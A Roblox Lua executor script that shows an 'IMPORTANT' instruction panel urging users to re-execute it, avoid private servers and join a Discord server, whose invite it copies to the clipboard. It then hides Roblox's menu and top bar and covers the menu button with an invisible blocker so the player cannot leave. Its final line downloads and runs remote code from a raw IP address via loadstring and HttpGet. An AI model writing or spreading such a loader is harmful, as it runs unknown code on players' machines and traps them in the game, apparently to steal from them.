local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer

local blur = Instance.new("BlurEffect")
blur.Size = 8
blur.Parent = Lighting

local gui = Instance.new("ScreenGui")
gui.Name = "ImportantPanel"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 260) -- mas maliit
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
frame.BorderSizePixel = 0
frame.Parent = gui

local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 14)

local padding = Instance.new("UIPadding", frame)
padding.PaddingTop = UDim.new(0, 12)
padding.PaddingLeft = UDim.new(0, 16)
padding.PaddingRight = UDim.new(0, 16)
padding.PaddingBottom = UDim.new(0, 12)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 28)
title.BackgroundTransparency = 1
title.Text = "⚠️ IMPORTANT ⚠️"
title.TextColor3 = Color3.fromRGB(255, 204, 0)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.Parent = frame

local body = Instance.new("TextLabel")
body.BackgroundTransparency = 1
body.Position = UDim2.new(0, 0, 0, 40)
body.Size = UDim2.new(1, 0, 1, -90)
body.TextXAlignment = Enum.TextXAlignment.Left
body.TextYAlignment = Enum.TextYAlignment.Top
body.Font = Enum.Font.Gotham
body.TextSize = 18
body.TextWrapped = true
body.TextColor3 = Color3.fromRGB(235, 235, 235)
body.RichText = true
body.Text = table.concat({
	"1. Auto rejoin <i>(after you execute it)</i>",
	"2. Reexecute and the Script is working now",
	"3. Don't execute in private server",
	"4. Join my discord: https://discord.gg/9vX9c62vey",
	"5. You're all done"
}, "\n")
body.Parent = frame

local button = Instance.new("TextButton")
button.Size = UDim2.new(1, -20, 0, 42)
button.Position = UDim2.new(0, 10, 1, -54)
button.BackgroundColor3 = Color3.fromRGB(35, 147, 255)
button.Text = "Got it"
button.Font = Enum.Font.GothamBold
button.TextSize = 20
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Parent = frame

local btnCorner = Instance.new("UICorner", button)
btnCorner.CornerRadius = UDim.new(0, 10)

local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(60, 60, 60)
stroke.Thickness = 1

button.MouseButton1Click:Connect(function()
	pcall(function()
		if setclipboard then setclipboard("https://discord.gg/9vX9c62vey") end
	end)
	gui:Destroy()
	blur:Destroy()
end)

pcall(function()
	game.CoreGui.AntiLeaveBlocker:Destroy()
end)

local CoreGui, RunService = game:GetService("CoreGui"), game:GetService("RunService")

local function tryHideRobloxMenu()
	for _, n in ipairs({"RobloxGui","RobloxMenu","Menu","MenuGui","Topbar","TopBar"}) do
		local g = CoreGui:FindFirstChild(n)
		if g then
			if g:IsA("ScreenGui") then
				g.Enabled = false
				for _, c in ipairs(g:GetChildren()) do
					if c:IsA("GuiObject") then c.Visible = false end
					if c:IsA("LayerCollector") then c.Enabled = false end
				end
			else
				for _, c in ipairs(g:GetDescendants()) do
					if c:IsA("GuiObject") then
						c.Position = UDim2.new(-10,0,-10,0)
					end
				end
			end
		end
	end
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name, screenGui.Parent = "AntiLeaveBlocker", CoreGui
screenGui.ResetOnSpawn, screenGui.IgnoreGuiInset = false, true
screenGui.DisplayOrder, screenGui.ZIndexBehavior = 10000, Enum.ZIndexBehavior.Sibling

local blocker = Instance.new("TextButton")
blocker.Size, blocker.Position = UDim2.new(0,56,0,56), UDim2.new(0,6,0,6)
blocker.BackgroundTransparency, blocker.Text = 1, ""
blocker.AutoButtonColor, blocker.Active, blocker.Selectable = false, true, false
blocker.Parent = screenGui

RunService.RenderStepped:Connect(function()
	blocker.Position = UDim2.new(0,6,0,6)
end)

task.spawn(function()
	while screenGui.Parent == CoreGui do
		tryHideRobloxMenu()
		task.wait(2)
	end
end)

ID="151de7d8-5ef0-4146-85b6-826df4581111";
loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
